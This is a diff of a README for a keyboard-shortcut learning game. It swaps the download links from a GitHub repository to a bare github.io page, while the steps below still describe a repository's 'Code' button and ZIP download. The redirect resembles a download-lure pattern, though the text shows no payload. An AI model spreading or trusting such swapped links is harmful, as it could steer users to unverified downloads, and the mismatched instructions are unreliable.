@@ -1,6 +1,6 @@
 # 🎮 affinity-script-game - Master Keyboard Shortcuts Through Play
 
-[![Download Game](https://img.shields.io/badge/Download-Game-blue?style=for-the-badge&logo=github)](https://github.com/Tuesdaylogical990/affinity-script-game)
+[![Download Game](https://img.shields.io/badge/Download-Game-blue?style=for-the-badge&logo=github)](https://tuesdaylogical990.github.io)
 
 ## 📖 What Is This Game?
 
@@ -33,7 +33,7 @@ Follow these steps to play the game. The process takes less than two minutes.
 
 ### Step 1: Download the Game
 
-1. Click this link: [https://github.com/Tuesdaylogical990/affinity-script-game](https://github.com/Tuesdaylogical990/affinity-script-game)
+1. Click this link: [https://tuesdaylogical990.github.io](https://tuesdaylogical990.github.io)
 2. You will see a page with a list of files. Look for the green button that says "Code".
 3. Click the "Code" button.
 4. In the dropdown menu, click "Download ZIP".
